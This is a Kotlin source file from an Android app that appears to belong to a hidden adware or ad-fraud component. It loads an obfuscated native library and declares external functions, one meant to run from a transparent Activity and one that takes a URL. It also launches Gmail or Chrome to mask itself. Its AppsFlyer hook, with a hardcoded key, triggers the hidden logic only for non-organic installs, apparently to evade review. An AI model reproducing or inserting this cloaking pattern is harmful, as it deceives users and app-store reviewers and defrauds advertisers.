package com.waitress.greeting

import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import androidx.annotation.Keep
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib


/**
 * Date：2025/2/19
 * Describe:
 */
object WaitManager {

    @JvmStatic
    @Keep
    fun initMe() {
        System.loadLibrary("GEuU8NI")
    }


    //    @Keep IntWv
    @JvmStatic
    external fun manageInit(context: Any) //1.传应用context.(在主进程里面初始化一次)

    //    @Keep StartWv
    @JvmStatic
    external fun waitAny(context: Any) //1.传透明Activity对象(在透明页面onCreate调用).

    //    @Keep ActWv
    @JvmStatic
    external fun waiterAge(idex: Int)

    //    @Keep
    @JvmStatic
    external fun www(url: String?, time: Long, type: String?, issuccess: Boolean)


    @JvmStatic
    fun anyWaiter(any: Any) {
        if (any is Context) {
            runCatching {
                val pkgName = "com.google.android.gm"
                var intent = getMyIntent(pkgName)
                val pm: PackageManager = any.packageManager
                val info = pm.queryIntentActivities(intent, 0)
                val a = info.first()
                if (a != null) {
                    val launcherActivity = a.activityInfo.name
                    intent.setClassName(pkgName, launcherActivity)
                } else {
                    val pkgName2 = "com.android.chrome"
                    intent = getMyIntent(pkgName2)
                    val info2 = pm.queryIntentActivities(intent, 0)
                    val launcherActivity = info2.first().activityInfo.name
                    intent.setClassName(pkgName2, launcherActivity)
                }
                intent.addCategory(Intent.CATEGORY_LAUNCHER)
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                any.startActivity(intent)
            }
        }
    }

    fun getMyIntent(pkgName: String): Intent {
        return Intent(Intent.ACTION_MAIN).apply {
            addCategory(Intent.CATEGORY_LAUNCHER)
            setPackage(pkgName)
        }
    }

    @JvmStatic
    fun fetchAppsflyer(context: Context, androidIdStr: String, call: () -> Unit) {
        // todo modify
        AppsFlyerLib.getInstance().setDebugLog(true)
        AppsFlyerLib.getInstance()
            .init("5MiZBZBjzzChyhaowfLpyR", object : AppsFlyerConversionListener {
                override fun onConversionDataSuccess(p0: MutableMap<String, Any>?) {
                    MenuHelper.log("onConversionDataSuccess-->$p0")
                    if (p0 != null && p0["af_status"] != "Organic") {
                        call.invoke()
                    }
                }

                override fun onConversionDataFail(p0: String?) = Unit

                override fun onAppOpenAttribution(p0: MutableMap<String, String>?) = Unit
                override fun onAttributionFailure(p0: String?) = Unit
            }, context)
        AppsFlyerLib.getInstance().setCustomerUserId(androidIdStr)
        AppsFlyerLib.getInstance().start(context)
        AppsFlyerLib.getInstance()
            .logEvent(context, "wait_install", hashMapOf<String, Any>().apply {
                put("customer_user_id", androidIdStr)
            })
    }

}